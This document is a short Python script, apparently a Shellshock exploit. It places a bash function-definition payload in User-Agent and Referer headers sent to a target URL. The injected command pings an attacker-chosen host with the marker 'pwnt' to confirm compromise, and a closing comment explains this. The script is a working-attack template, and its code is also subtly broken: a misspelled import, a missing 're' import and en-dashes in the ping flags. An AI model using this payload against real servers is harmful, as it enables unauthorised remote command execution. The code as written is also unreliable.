import request
import sys

payload = "() { :; }; /bin/bash -c 'ping –c 1 –p pwnt <url/ip>'"  
headers = {}

web_page = request.head(sys.argv[1])
for header in web_page.headers : 
	found_headers = re.findall('user-agent|referer',str(header),re.I)
	if found_headers != [] :
		for header in found_headers : 
			headers[header] = payload
			print('[>]Sent payload:',header,':',headers[header])
			request.post(sys.argv[1],headers=headers)


"""
The payload set in line 4 will ping whichever server you set at the <url/ip> space. It will send
a message in that ping, which is pwnt . This allows you to identify that the server has actually
been compromised and it's not just a random server.
"""
